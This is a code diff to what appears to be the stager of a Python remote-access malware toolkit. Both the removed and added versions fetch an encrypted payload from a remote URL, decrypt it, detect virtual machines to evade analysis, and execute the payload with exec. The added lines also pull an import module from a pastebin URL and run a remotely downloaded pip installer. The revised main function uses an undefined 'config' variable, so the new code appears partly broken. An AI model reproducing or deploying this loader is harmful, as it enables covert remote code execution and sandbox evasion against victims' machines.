@@ -51,27 +51,20 @@ def decrypt(data, key):
     except Exception as e:
         debug(e)
 
-def install(source):
+def install(module):
     try:
-        config   = json.loads(urllib.urlopen(str(source)).read())
         pip_exe  = os.popen('where pip' if os.name is 'nt' else 'which pip').read().rstrip()
         if not pip_exe:
             exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
-            __RELOAD = True
-            return config
+            os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
         else:
-            os.chdir(os.path.expandvars('%TEMP%')) if os.name == 'nt' else os.chdir('/tmp')
-            packages = json.loads(urllib.urlopen(config['modules']).read())
-            arch = str(struct.calcsize('P') * 8)               
-            for name, url in packages[os.name][arch].items():
-                try:
-                    exec "import %s" % name in globals()
-                except ImportError:
-                    __RELOAD = True
-                    subprocess.Popen([pip_exe, 'install', url], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
-            return config
-    except Exception as e:
-        debug(e)
+            exec "import %s" % str(module)
+    except ImportError:
+        try:
+            subprocess.Popen([pip_exe, 'install', str(module)], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
+            os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
+        except:
+            raise ImportError
 
 def antiforensics():
     try:
@@ -82,32 +75,31 @@ def antiforensics():
         debug(e)
 
 def main(*args, **kwargs):
-        __DEBUG = kwargs.get('debug')
-        xor_key = ''
-        api_key = ''
-        payload = ''
-        if 'config' in kwargs:
-            config = kwargs.get('config')
-            if isinstance(config, dict):
-                if 'modules' in config:
-                    install(config.get('modules'))
-                if 'xor_key' in config:
-                    xor_key = decrypt(urllib.urlopen(config.get('xor_key')).read(), base64.b64decode('$KEY$'))
-                if 'payload' in config:
-                    payload = decrypt(urllib.urlopen(config.get('payload')).read(), xor_key)
-                    if 'api_key' in config:
-                        payload = "\n".join([payload, "\nif __name__ == '__main__':", "    shell = Shell()", "    shell.run(config='{}')".format(config.get('api_key'))])
-                if __RELOAD:
-                    debug("Finished installing missing dependencies.\nRestarting...")
-                    os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
-                if config.get('antiforensics'):
-                    if antiforensics():
-                        debug("Virtual machine detected.")
-                        sys.exit(0)
-                if payload:
-                    exec payload in globals()
-            else:
-                debug("Invalid data type for 'config' (expected '{}', got '{}')".format(dict, type(config)))
-        else:
-            debug("Missing argument 'config'")
+    
+    global __DEBUG
+    global __RELOAD
+    
+    __DEBUG = bool('--debug' in sys.argv or 'debug' in sys.argv)
+
+    try:
+        install('httpimport')
+    except ImportError:
+        try:
+            install('https://pastebin.com/raw/2BvzFFHq')
+        except ImportError:
+            debug("[-] Import module 'httpimport' failed.")
+            
+    if 'payload' in kwargs:
+        debug("Decrypting payload...")
+        payload = decrypt(urllib.urlopen(kwargs.get('payload')).read(), '__KEY__')
+
+    if config.get('antiforensics'):
+        debug("Checking for virtual machines...")
+        if antiforensics():
+            debug("Virtual machine detected.")
+            sys.exit(0)
+
+    if payload:
+        debug("Running payload...")
+        exec payload in globals()
 
